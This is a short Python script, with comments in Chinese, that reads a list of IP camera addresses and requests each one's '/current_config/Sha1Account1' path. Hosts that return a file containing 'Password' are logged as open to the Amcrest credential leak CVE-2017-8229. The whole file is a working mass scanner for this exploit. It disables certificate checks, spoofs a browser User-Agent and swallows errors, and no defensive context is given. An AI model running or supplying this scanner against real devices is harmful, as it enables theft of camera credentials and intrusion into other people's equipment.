import requests

requests.packages.urllib3.disable_warnings()
headers = {
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0"
	}

for i in open("ip camera.txt"):
	try:
		i = i.replace("\n", "")
		if ("http://" in i):
			continue
		print(i+" 正在检测中------")
		jiaoyan = requests.get(i+"/current_config/Sha1Account1", headers=headers, timeout=2, verify=False, allow_redirects=False)
		if (jiaoyan.headers['CONTENT-TYPE'] == 'application/octet-stream') and ("Password" in jiaoyan.text) and (jiaoyan.status_code == 200):
			with open("Amcrest IP Camera Web 敏感泄露漏洞 (CVE-2017-8229) vul.txt", "a+") as f:
				print(i+"--->存在漏洞Amcrest IP Camera Web 敏感泄露漏洞 (CVE-2017-8229)")
				f.write(i+"\n")
	except:
		continue
